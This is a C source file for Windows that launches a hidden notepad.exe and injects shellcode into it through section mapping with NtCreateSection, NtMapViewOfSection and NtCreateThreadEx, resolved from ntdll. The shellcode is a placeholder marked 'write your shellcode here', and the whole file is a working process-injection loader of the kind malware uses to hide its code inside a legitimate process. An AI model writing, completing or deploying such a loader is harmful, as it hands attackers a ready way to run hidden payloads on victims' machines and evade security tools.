#include <stdio.h>
#include <Windows.h>
#include "CWLInc.h"

int main(int argc, char** argv) {
	
unsigned char payload[] = "\xCC\xCC\xCC\xCC";// write your shellcode here
	// parsing argument
	STARTUPINFOW start_info;
	PROCESS_INFORMATION process_info;
	HANDLE hProcess = NULL;
	ZeroMemory(&start_info, sizeof(start_info));
	start_info.cb = sizeof(start_info);
	ZeroMemory(&process_info, sizeof(process_info));
	start_info.dwFlags = STARTF_USESHOWWINDOW;
	start_info.wShowWindow = SW_HIDE;
	wchar_t process_name[] = L"notepad.exe";
	BOOL iscreated = CreateProcessW(NULL, process_name, NULL, NULL, FALSE, 0, NULL, NULL, &start_info, &process_info);
	if (iscreated)
	{
		printf("[+] Created New Process\n");
	}
	else
	{
		printf("[-] Failed to Create New Process\n");
	}

	_NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
	if (pNtCreateSection == NULL) {
		perror("[-] Unable to find API NtCreateSection\n");
		exit(-1);
	}
	_NtMapViewOfSection pNtMapViewOfSection = (_NtMapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");
	if (pNtMapViewOfSection == NULL) {
		perror("[-] Unable to find API NtMapViewOfSection \n");
		exit(-1);
	}
	_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
	if (pNtCreateThreadEx == NULL) {
		perror("[-] Unable to find API NtCreateThreadEx \n");
		exit(-1);
	}
	NTSTATUS status;
	HANDLE hSection;
	HANDLE hTargetProcess = INVALID_HANDLE_VALUE;
	HANDLE hThread;
	PVOID local_view_addr = NULL;
	PVOID remote_view_addr = NULL;
	SIZE_T size = 0x1000;
	LARGE_INTEGER section_size = { size };
	// opening target process
	hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_info.dwProcessId);
	if (hTargetProcess == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open target process. Err %d \n", GetLastError());
		exit(-1);
	}
	// Create a new Section with RWX permission
	status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &section_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to create section. Err 0x%x \n", status);
		exit(-1);
	}
	printf("[+] Section created, handle value : %d \n", hSection);
	// map view of section to local process (injector): RW
	status = pNtMapViewOfSection(hSection, GetCurrentProcess(), &local_view_addr, NULL, NULL, NULL, &size, ViewUnmap, NULL, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to map section. Err 0x%x \n", status);
		exit(-1);
	}
	printf("[+] Section mapped to local process: %p\n", local_view_addr);

	// map view of section to target process: RX
	status = pNtMapViewOfSection(hSection, hTargetProcess, &remote_view_addr, NULL, NULL, NULL, &size, ViewUnmap, NULL, PAGE_EXECUTE_READ);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to map section to target process. Err 0x%x \n", status);
		exit(-1);
	}
	printf("[+] Section mapped to remote process: %p\n", remote_view_addr);

	memcpy(local_view_addr, payload, sizeof(payload));

	status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hTargetProcess, (LPTHREAD_START_ROUTINE)remote_view_addr, NULL, FALSE, 0, 0, 0, NULL);
	if (!NT_SUCCESS(status)) {
		printf("[-] Error Creating Thread: %x", status);
		exit(-1);
	}
	printf("[+] Thread Executed...\n");

}
